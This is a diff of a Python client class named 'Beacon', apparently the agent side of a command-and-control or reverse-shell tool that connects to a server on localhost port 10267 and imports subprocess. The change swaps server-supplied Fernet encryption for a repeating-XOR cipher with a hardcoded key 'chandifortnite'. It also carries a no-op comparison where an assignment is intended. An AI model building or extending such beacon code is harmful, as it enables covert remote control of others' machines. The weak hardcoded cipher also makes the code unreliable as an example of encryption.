@@ -1,18 +1,19 @@
 #!/usr/bin/python3
 
 import socket,subprocess,time
-from cryptography.fernet import Fernet
+from Crypto.Util.strxor import strxor
 
 class Beacon:
    #Contains client side behavior and state
 
-   __slots__ = ["sock","running","server_ip","server_port","debugging","key","fern","encryption"]
+   __slots__ = ["sock","running","server_ip","server_port","debugging","key","encryption"]
 
    def __init__(self,server_ip,server_port):
       self.running = False
       self.server_ip = server_ip
       self.server_port = server_port
       self.debugging = True
+      self.key = "chandifortnite"
 
    def connect(self):
       try:
@@ -21,8 +22,6 @@ class Beacon:
          message = self.sock.recv(15).decode()
          if message == "encryption on":
             self.encryption = True
-            self.key = self.sock.recv(65535)
-            self.fern = Fernet(self.key)
          elif message == "encryption off":
             self.encryption == False
          else:
@@ -112,10 +111,12 @@ class Beacon:
          self.sock.close()
    
    def encrypt(self,data):
-      return self.fern.encrypt(data)
+      key = self.key * (len(data) // len(self.key)) + self.key[:len(data) % len(self.key)]
+      return strxor(data,key.encode())
 
    def decrypt(self,data):
-      return self.fern.decrypt(data)
+      key = self.key * (len(data) // len(self.key)) + self.key[:len(data) % len(self.key)]
+      return strxor(data,key.encode())
 
 def main():
    beacon = Beacon("127.0.0.1",10267)
